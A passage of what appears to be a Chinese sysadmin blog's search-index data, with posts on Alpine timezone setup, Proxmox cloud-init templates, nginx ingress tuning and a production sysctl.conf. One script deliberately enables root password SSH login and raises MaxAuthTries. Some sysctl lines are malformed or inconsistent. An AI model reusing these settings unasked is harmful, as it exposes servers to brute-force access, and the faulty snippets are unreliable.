class=\"s\"\u003eAsia/Shanghai\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ecp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eecho $TZ \u0026gt; /etc/timezone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# install chrony and place default conf which can be overridden with volume\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --no-cache chrony \u0026amp;\u0026amp; mkdir -p /etc/chrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY chrony.conf /etc/chrony/.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# port exposed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 123/udp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# start\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [ \u0026#34;/usr/sbin/chronyd\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;-s\u0026#34;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e时间设定重要的就是下面这几行\u003c/p\u003e","title":"alphine镜像中timezone的设定"},{"content":"其实我们的生产环境一直是 KVM ，然后用 shell 脚本控制虚机的生成，也是用到了 Cloud-init 的标准镜像。\n听说 Proxmox 也很不错，于是想看看能否也在生产环境中用上\n如果在生产环境中用，必须要让 proxmox 支持 cloud-init ，否则无意义，下面也说一下跑在生产的注意事项\n首先我们用光盘安装：\n然后第一个注意的地方就是硬盘，选 Options 后：\n会冒出一堆选项，公司的生产环境，服务器如果没有 raid 卡是很奇怪的，所以 zfs 反而不是标配，因为我们会事先在 raid 卡上划分好硬盘，生产环境基本必然是 raid10 ，接下来就是 ext4 和 xfs 二选一了，八戒选 ext4 ，因为坏了好修理，xfs_repair 用起来相当龟毛：\n那么，选定了 ext4 ，接下来就比较重要了\nhdsize 1116.0 ，单位是G，这个是自动收集上来的，不用改\nswapsize，交换分区大小，这个给 8 G（最大8G）\nmaxroot，这个分区是第一个分区，存放 iso 和 template 的，需要给够，100 G\nminfree，第一个分区最小留多大，给 10 G（缺省16G）\nmaxvz，这个分区是第二个分区，存放实际的虚机文件，全都用上，什么也不填写\n然后继续，国家选 china，Hostname 填写 proxmox-168-86-103.local，再填写好其他信息，就安装成功了。\n打开网页，我们可以看到一个 local，100G，对应上面的 maxroot\n然后 local-lvm ，就是剩余放虚机的空间\nssh登录系统，首先换成中科大的 apt 源，并升级一下系统：\nsed -i \u0026#39;s|^deb http://ftp.debian.org|deb https://mirrors.ustc.edu.cn|g\u0026#39; /etc/apt/sources.list sed -i \u0026#39;s|^deb http://security.debian.org|deb https://mirrors.ustc.edu.cn/debian-security|g\u0026#39; /etc/apt/sources.list CODENAME=`cat /etc/os-release |grep CODENAME |cut -f 2 -d \u0026#34;=\u0026#34;` echo \u0026#34;deb https://mirrors.ustc.edu.cn/proxmox/debian $CODENAME pve-no-subscription\u0026#34; \u0026gt; /etc/apt/sources.list.d/pve-no-subscription.list cat /etc/apt/sources.list.d/pve-no-subscription.list rm /etc/apt/sources.list.d/pve-enterprise.list apt update apt upgrade 那生产使用，是必须用 Cloud-init 的标准化镜像的。我们需要造出一个 template 。\n以 Centos7 为例子\nwget http://cloud.centos.org/centos/7/images/CentOS-7-x86_64-GenericCloud.qcow2 apt-get install libguestfs-tools 然后准备脚本 modify.sh：\n#!/bin/sh image_name=CentOS-7-x86_64-GenericCloud.qcow2 # virt-edit -a ${image_name} /etc/cloud/cloud.cfg virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/disable_root: [Tt]rue/disable_root: False/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/disable_root: 1/disable_root: 0/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/lock_passwd: [Tt]rue/lock_passwd: False/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/lock_passwd: 1/lock_passwd: 0/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/ssh_pwauth: 0/ssh_pwauth: 1/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/PasswordAuthentication no/PasswordAuthentication yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/PermitRootLogin [Nn]o/PermitRootLogin yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/#PermitRootLogin [Yy]es/PermitRootLogin yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/[#M]axAuthTries 6/MaxAuthTries 20/\u0026#39; virt-customize --install cloud-init,atop,htop,nano,vim,qemu-guest-agent,curl,wget,telnet,lsof,screen -a ${image_name} 运行它，以上命令其实是侵入镜像，修改 sshd_config 允许 root 用 password 登录，然后又安了几个常用软件，大家可以按需修改。\n最后生成 template , 脚本： vm.sh\n#!/bin/sh vm_id=9999 image_name=CentOS-7-x86_64-GenericCloud.qcow2 qm create ${vm_id} --memory 8196 --net0 virtio,bridge=vmbr0 qm importdisk ${vm_id} ${image_name} local-lvm qm set ${vm_id} --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-${vm_id}-disk-0 qm set ${vm_id} --ide2 local-lvm:cloudinit qm set ${vm_id} --boot c --bootdisk scsi0 qm set ${vm_id} --serial0 socket --vga serial0 qm template ${vm_id} cloud-init 技术的核心其实就是用配置文件，在虚机启动的时候动态修改，这里把配置放到了 ide2 的一个虚拟 cdrom 中\n最终会生成一个 id 为 9999 的 template\n我们还需要改两处：\n一是 CPU、MEMORY、硬盘大小，缺省是 8G，我们生产的镜像标配是80G，需要 resize , 加 72G，合计80G\n二是 cloud-init 部分，用户名、密码、DNS、IP、MASK、GATEWAY\n这样这个 template 就做好了，在生产的时候，只需要 clone 这个模板（模式要选 Full Clone），然后记得修改为不同的IP，就可以了。\n总体来说，这个东西偏小白，对于习惯了 KVM 的人来说，反而不如脚本来的快。\n相关文档：https://whattheserver.com/proxmox-cloud-init-os-template-creation/\n","permalink":"https://rendoumi.com/posts/20211103-proxmox/","summary":"\u003cp\u003e其实我们的生产环境一直是 KVM ，然后用 shell 脚本控制虚机的生成，也是用到了 Cloud-init 的标准镜像。\u003c/p\u003e\n\u003cp\u003e听说 Proxmox 也很不错，于是想看看能否也在生产环境中用上\u003c/p\u003e\n\u003cp\u003e如果在生产环境中用，必须要让 proxmox 支持 cloud-init ，否则无意义，下面也说一下跑在生产的注意事项\u003c/p\u003e\n\u003cp\u003e首先我们用光盘安装：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103100713668\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103100713668.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后第一个注意的地方就是硬盘，选 Options 后：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103101222517\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103101222517.png\"\u003e\u003c/p\u003e\n\u003cp\u003e会冒出一堆选项，公司的生产环境，服务器如果没有 raid 卡是很奇怪的，所以 zfs 反而不是标配，因为我们会事先在 raid 卡上划分好硬盘，生产环境基本必然是 raid10 ，接下来就是 ext4 和 xfs 二选一了，八戒选 ext4 ，因为坏了好修理，xfs_repair 用起来相当龟毛：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103101317418\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103101317418.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么，选定了 ext4 ，接下来就比较重要了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103104456187\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103104456187.png\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ehdsize 1116.0 ，单位是G，这个是自动收集上来的，不用改\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eswapsize，交换分区大小，这个给 8 G（最大8G）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emaxroot，这个分区是第一个分区，存放 iso 和 template 的，需要给够，100 G\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eminfree，第一个分区最小留多大，给 10 G（缺省16G）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emaxvz，这个分区是第二个分区，存放实际的虚机文件，全都用上，什么也不填写\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e然后继续，国家选 china，Hostname 填写 proxmox-168-86-103.local，再填写好其他信息，就安装成功了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211202114720545\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211202114720545.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211202114814774\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211202114814774.png\"\u003e\u003c/p\u003e\n\u003cp\u003e打开网页，我们可以看到一个 local，100G，对应上面的 maxroot\u003c/p\u003e\n\u003cp\u003e然后 local-lvm ，就是剩余放虚机的空间\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103110216144\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103110216144.png\"\u003e\u003c/p\u003e","title":"生产环境Proxmox 7.02的安装和配置"},{"content":"kubernetes 中 nginx ingress 的优化分两部分\n一、系统sysctl部分优化 首先是对nginx启动前的系统性能进行优化，这部分调整网络的缓冲区，减小闲置 socket 关闭的时间\n以阿里 ACK 为例，我们可以编辑 deployments 的 nginx-ingress-controller\ninitContainers: - command: - /bin/sh - -c - | mount -o remount rw /proc/sys sysctl -w net.core.somaxconn=65535 sysctl -w net.ipv4.ip_local_port_range=\u0026#34;1024 65535\u0026#34; sysctl -w net.ipv4.tcp_tw_reuse=1 sysctl -w fs.file-max=1048576 sysctl -w net.ipv4.tcp_keepalive_time = 300 sysctl -w net.ipv4.tcp_keepalive_probes = 5 sysctl -w net.ipv4.tcp_keepalive_intvl = 15 二、nginx ingress 参数优化 大家制动，nginx ingree 其实是做为一个中间代理，所以上下游的socket参数也需要优化\n同样以阿里ACK为例，我们可以编辑 configmaps 的 nginx-configuration\napiVersion: v1 data: allow-backend-server-header: \u0026#34;true\u0026#34; enable-underscores-in-headers: \u0026#34;true\u0026#34; generate-request-id: \u0026#34;true\u0026#34; ignore-invalid-headers: \u0026#34;true\u0026#34; log-format-upstream: $remote_addr - [$remote_addr] - $remote_user [$time_local] \u0026#34;$request\u0026#34; $status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#34;$http_user_agent\u0026#34; $request_length $request_time [$proxy_upstream_name] $upstream_addr $upstream_response_length $upstream_response_time $upstream_status $req_id $host [$proxy_alternative_upstream_name] proxy-body-size: 20m proxy-connect-timeout: \u0026#34;10\u0026#34; reuse-port: \u0026#34;true\u0026#34; server-tokens: \u0026#34;false\u0026#34; ssl-redirect: \u0026#34;false\u0026#34; upstream-keepalive-timeout: \u0026#34;900\u0026#34; keep-alive-requests: \u0026#34;10000\u0026#34; upstream-keepalive-connections: \u0026#34;500\u0026#34; max-worker-connections: \u0026#34;65536\u0026#34; worker-cpu-affinity: auto kind: ConfigMap ","permalink":"https://rendoumi.com/posts/20211102-ingress_nginx/","summary":"\u003cp\u003ekubernetes 中 nginx ingress 的优化分两部分\u003c/p\u003e\n\u003ch2 id=\"一系统sysctl部分优化\"\u003e一、系统sysctl部分优化\u003c/h2\u003e\n\u003cp\u003e首先是对nginx启动前的系统性能进行优化，这部分调整网络的缓冲区，减小闲置 socket 关闭的时间\u003c/p\u003e\n\u003cp\u003e以阿里 ACK 为例，我们可以编辑 deployments 的 nginx-ingress-controller\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"na\"\u003einitContainers:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"na\"\u003e- command:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e- /bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e- -c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e- |\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003emount -o remount rw /proc/sys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003esysctl -w net.core.somaxconn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e65535\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.ip_local_port_range=\u0026#34;1024 65535\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_tw_reuse=1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w fs.file-max=1048576\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_keepalive_time = 300\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_keepalive_probes = 5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_keepalive_intvl = 15\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二nginx-ingress-参数优化\"\u003e二、nginx ingress 参数优化\u003c/h2\u003e\n\u003cp\u003e大家制动，nginx ingree 其实是做为一个中间代理，所以上下游的socket参数也需要优化\u003c/p\u003e","title":"k8s中nginx ingress的性能优化"},{"content":"这篇是纯配置篇，解释都在配置里了，是生产服务器 sysctl.conf 的配置\n### KERNEL ### # Reboot after 10sec. on kernel panic kernel.panic = 10 ### IMPROVE SYSTEM MEMORY MANAGEMENT ### # Increase size of file handles and inode cache fs.file-max = 2097152 # Insure we always have enough memory vm.min_free_kbytes = 8192 # Do less swapping vm.swappiness = 10 vm.dirty_ratio = 10 vm.dirty_background_ratio = 2 ### GENERAL NETWORK SECURITY OPTIONS ### # Avoid a smurf attack net.ipv4.icmp_echo_ignore_broadcasts = 1 # Turn on protection for bad icmp error messages net.ipv4.icmp_ignore_bogus_error_responses = 1 # Turn on syncookies for SYN flood attack protection net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 8192 # Turn on timestamping net.ipv4.tcp_timestamps = 1 # Turn on and log spoofed, source routed, and redirect packets net.ipv4.conf.all.log_martians = 1 net.ipv4.conf.default.log_martians = 1 # No source routed packets here net.ipv4.conf.all.accept_source_route = 0 net.ipv4.conf.default.accept_source_route = 0 # Turn on reverse path filtering net.ipv4.conf.all.rp_filter = 1 net.ipv4.conf.default.rp_filter = 1 # Make sure no one can alter the routing tables net.ipv4.conf.all.accept_redirects = 0 net.ipv4.conf.default.accept_redirects = 0 net.ipv4.conf.all.secure_redirects = 0 net.ipv4.conf.default.secure_redirects = 0 # Don\u0026#39;t act as a router net.ipv4.ip_forward = 0 net.ipv4.conf.all.send_redirects = 0 net.ipv4.conf.default.send_redirects = 0 # Number of times SYNACKs for passive TCP connection. net.ipv4.tcp_synack_retries = 2 # Allowed local port range net.ipv4.ip_local_port_range = 1024 65000 # Protect Against TCP Time-Wait net.ipv4.tcp_rfc1337 = 1 # Decrease the time default value for tcp_fin_timeout connection net.ipv4.tcp_fin_timeout = 15 # Decrease the time default value for connections to keep alive net.ipv4.tcp_keepalive_time = 300 net.ipv4.tcp_keepalive_probes = 5 net.ipv4.tcp_keepalive_intvl = 15 # This means that the keepalive process waits 300 seconds for socket # activity before sending the first keepalive probe, and then resend # it every 15 seconds. If no ACK response is received for 5 consecutive # times (75s in this case), the connection is marked as broken. ### TUNING NETWORK PERFORMANCE ### # Disable IPv6 net.ipv6.conf.all.disable_ipv6 = 1 net.ipv6.conf.default.disable_ipv6 = 1 net.ipv6.conf.lo.disable_ipv6 = 1 # Default Socket Receive Buffer net.core.rmem_default = 31457280 # Maximum Socket Receive Buffer net.core.rmem_max = 12582912 # Default Socket Send Buffer net.core.wmem_default = 31457280 # Maximum Socket Send Buffer net.core.wmem_max = 12582912 # Increase number of incoming connections net.core.somaxconn = 5000 # Increase number of incoming connections backlog net.core.netdev_max_backlog = 65536 # Enable TCP window scaling net.ipv4.tcp_window_scaling = 1 # Increase the maximum amount of option memory buffers net.core.optmem_max = 25165824 # Increase the maximum total buffer-space allocatable # This is measured in units of pages (4096 bytes) net.ipv4.tcp_mem = 65536 131072 262144 net.ipv4.udp_mem = 65536 131072 262144 # Increase the read-buffer space allocatable net.ipv4.tcp_rmem = 8192 87380 16777216 net.ipv4.udp_rmem_min = 16384 # Increase the write-buffer-space allocatable net.ipv4.tcp_wmem = 8192 65536 16777216 net.ipv4.udp_wmem_min = 16384 # Increase the tcp-time-wait buckets pool size to prevent simple DOS attacks net.ipv4.tcp_max_tw_buckets = 1800000 # TIME_WAIT socket policy # Note: if both enabled then disable # net.ipv4.tcp_timestamps for servers # behind NAT to prevent dropped incoming connections #net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_tw_reuse = 1 # Enable TCP MTU probing (in case of Jumbo Frames enabled) #net.ipv4.tcp_mtu_probing = 1 # Speedup retrans (Google recommended) net.ipv4.tcp_slow_start_after_idle = 0 net.ipv4.tcp_early_retrans = 1 # Conntrack # 288bytes x 131072 = 37748736 (~38MB) max memory usage #net.netfilter.nf_conntrack_max = 131072 #net.netfilter.nf_conntrack_tcp_loose = 1 #TCP的直接拥塞通告(tcp_ecn)关掉 net.ipv4.tcp_ecn = 0 #路由缓存刷新频率，当一个路由失败后多长时间跳到另一个路由，默认是300。 net.ipv4.route.gc_timeout = 100 #设定系统中最多允许在多少TCP套接字不被关联到任何一个用户文件句柄上。 #如果超过这个数字，没有与用户文件句柄关联的TCP 套接字将立即被复位 #防简单Dos net.ipv4.tcp_max_orphans = 655360 # NOTE: Enable this if machine support it # -- 10gbe tuning from Intel ixgb driver README -- # # turn off selective ACK and timestamps #net.ipv4.tcp_sack = 0 #net.ipv4.tcp_timestamps = 1 ** 注意，net.ipv4.tcp_tw_recycle 不要打开，在 NAT 环境中会出错，而且在 K8S 中也会因 NAT 导致 pod 出错，切记！！！**\n","permalink":"https://rendoumi.com/posts/20211102-sysctl_conf/","summary":"\u003cp\u003e这篇是纯配置篇，解释都在配置里了，是生产服务器 sysctl.conf 的配置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### KERNEL ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Reboot after 10sec. on kernel panic\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekernel.panic\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### IMPROVE SYSTEM MEMORY MANAGEMENT ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase size of file handles and inode cache\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efs.file-max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Insure we always have enough memory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.min_free_kbytes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Do less swapping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.swappiness\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.dirty_ratio\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.dirty_background_ratio\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### GENERAL NETWORK SECURITY OPTIONS ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Avoid a smurf attack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.icmp_echo_ignore_broadcasts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on protection for bad icmp error messages\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.icmp_ignore_bogus_error_responses\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on syncookies for SYN flood attack protection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_syncookies\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_max_syn_backlog\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on timestamping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_timestamps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on and log spoofed, source routed, and redirect packets\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.log_martians\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 